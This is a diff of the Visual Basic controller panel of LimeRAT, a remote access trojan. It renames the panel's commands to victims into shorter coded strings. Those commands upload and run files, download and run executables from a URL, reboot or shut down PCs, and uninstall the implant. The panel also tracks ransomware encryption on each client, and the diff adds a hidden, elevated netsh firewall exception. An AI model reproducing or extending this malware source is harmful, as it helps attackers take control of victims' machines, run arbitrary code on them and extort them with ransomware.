@@ -47,7 +47,6 @@ Public Class Main
     Private Sub Main_Load(sender As Object, e As EventArgs) Handles MyBase.Load
         CheckForIllegalCrossThreadCalls = False
         Try : My.Computer.Audio.Play(My.Resources.Intro, AudioPlayMode.Background) : Catch : End Try 'https://freesound.org/people/eardeer/sounds/385281/
-
         Try
             S = New S_Socket(S_Settings.PORT)
         Catch ex As Exception
@@ -84,22 +83,26 @@ Public Class Main
                 Messages("{ Established! }", "Connection is established")
             End If
         Catch ex As Net.Sockets.SocketException
+            MetroProgressSpinner1.Spinning = False
             MetroLabel3.Text = "CLOSED [" & GetExternalAddress() & "  @" & S_Settings.PORT & "  #" & S_Settings.EncryptionKey & "]"
             MetroLabel3.ForeColor = Color.Red
             Messages("{ Established! }", "But port " & S_Settings.PORT & " seems to be blocked")
             Try : My.Computer.Audio.Play(Application.StartupPath + "\Misc\Error.wav", AudioPlayMode.Background) : Catch : End Try 'https://freesound.org/people/eardeer/sounds/385281/
             Dim result As DialogResult = MessageBox.Show("Port " & S_Settings.PORT & " seems to be blocked" + Environment.NewLine + "Do you want to add LimeRAT into firewall exception", "", MessageBoxButtons.YesNo)
             If result = DialogResult.Yes Then
-                Dim process As New Process()
-                process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
-                process.StartInfo.FileName = "cmd.exe"
-                process.StartInfo.UseShellExecute = True
-                process.StartInfo.Verb = "runas"
-                process.StartInfo.Arguments = "/c netsh advfirewall firewall add rule name=""LimeRAT"" dir=in action=allow program=""" & Application.ExecutablePath & """ enable=yes"
-                process.Start()
-                process.WaitForExit(0)
-                Process.Start(Application.ExecutablePath)
-                End
+                Try
+                    Dim process As New Process()
+                    process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
+                    process.StartInfo.FileName = "cmd.exe"
+                    process.StartInfo.UseShellExecute = True
+                    process.StartInfo.Verb = "runas"
+                    process.StartInfo.Arguments = "/c netsh advfirewall firewall add rule name=""LimeRAT"" dir=in action=allow program=""" & Application.ExecutablePath & """ enable=yes"
+                    process.Start()
+                    process.WaitForExit()
+                    Process.Start(Application.ExecutablePath)
+                    End
+                Catch ex1 As Exception
+                End Try
             End If
         Finally
             Try : Client.Close() : Catch : End Try
@@ -843,6 +846,10 @@ Public Class Main
         End Function
     End Class
 
+    Private Sub MetroTabPage1_Enter(sender As Object, e As EventArgs) Handles MetroTabControl1.Click
+        On Error Resume Next
+        Fix()
+    End Sub
 
     Private Sub MetroToggle1_CheckedChanged(sender As Object, e As EventArgs) Handles MetroToggle1.CheckedChanged
         On Error Resume Next
@@ -1112,21 +1119,21 @@ Public Class Main
     Private Sub PCRestartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PCRestartToolStripMenuItem.Click
         On Error Resume Next
         For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.Tag, "PC-RES")
+            S.Send(x.Tag, "PC-" + SPL + "1")
         Next
     End Sub
 
     Private Sub PCShutdownToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PCShutdownToolStripMenuItem.Click
         On Error Resume Next
         For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.Tag, "PC-SHUT")
+            S.Send(x.Tag, "PC-" + SPL + "2")
         Next
     End Sub
 
     Private Sub PCLogoutToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles PCLogoutToolStripMenuItem.Click
         On Error Resume Next
         For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.Tag, "PC-OUT")
+            S.Send(x.Tag, "PC-" + SPL + "3")
         Next
     End Sub
 
@@ -1144,7 +1151,7 @@ Public Class Main
 
         If o.ShowDialog = Windows.Forms.DialogResult.OK Then
             For Each x As ListViewItem In L1.SelectedItems
-                S.Send(x.Tag, "RunDisk" & SPL & o.FileName & SPL & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)) & SPL & "update")
+                S.Send(x.Tag, "RD-" & SPL & o.FileName & SPL & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)) & SPL & "update")
             Next
         End If
     End Sub
@@ -1158,7 +1165,7 @@ Public Class Main
             Exit Sub
         Else
             For Each x As ListViewItem In L1.SelectedItems
-                S.Send(x.Tag, "RunURL" & SPL & URL & SPL & EXE & SPL & "update")
+                S.Send(x.Tag, "RU-" & SPL & URL & SPL & EXE & SPL & "update")
             Next
         End If
     End Sub
@@ -1166,14 +1173,14 @@ Public Class Main
     Private Sub RestartToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles RestartToolStripMenuItem.Click
         On Error Resume Next
         For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.Tag, "Reconnect")
+            S.Send(x.Tag, "CL-" + SPL + "2")
         Next
     End Sub
 
     Private Sub CloseToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles CloseToolStripMenuItem.Click
         On Error Resume Next
         For Each x As ListViewItem In L1.SelectedItems
-            S.Send(x.Tag, "Close")
+            S.Send(x.Tag, "CL-" + SPL + "1")
         Next
     End Sub
 
@@ -1183,13 +1190,11 @@ Public Class Main
         For Each x As ListViewItem In L1.SelectedItems
             If x.SubItems(RANS.Index).Text = "Encryption in progress..." OrElse x.SubItems(RANS.Index).Text = "Decryption in progress..." OrElse x.SubItems(RANS.Index).Text = "Encrypted" Then
                 result = MessageBox.Show("Client didn't finish decrypting yet.." & vbNewLine & vbNewLine & "This might corrupt all files, Do you still want to countine? ", "", MessageBoxButtons.YesNo)
-                If result = DialogResult.No Then
-                    '
-                ElseIf result = DialogResult.Yes Then
-                    S.Send(x.Tag, "Uninstall")
+                If result = DialogResult.Yes Then
+                    S.Send(x.Tag, "CL-" + SPL + "3")
                 End If
             Else
-                S.Send(x.Tag, "Uninstall")
+                S.Send(x.Tag, "CL-" + SPL + "3")
             End If
         Next
     End Sub
@@ -1224,7 +1229,7 @@ Public Class Main
             If o.ShowDialog = Windows.Forms.DialogResult.OK Then
 
                 For Each x As ListViewItem In L1.SelectedItems
-                    S.Send(x.Tag, "RunDisk" & SPL & o.FileName & SPL & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)))
+                    S.Send(x.Tag, "RD-" & SPL & o.FileName & SPL & Convert.ToBase64String(IO.File.ReadAllBytes(o.FileName)))
                 Next
             End If
         Catch ex As Exception
@@ -1239,7 +1244,7 @@ Public Class Main
             Exit Sub
         Else
             For Each x As ListViewItem In L1.SelectedItems
-                S.Send(x.Tag, "RunURL" & SPL & URL & SPL & EXE)
+                S.Send(x.Tag, "RU-" & SPL & URL & SPL & EXE)
             Next
         End If
     End Sub
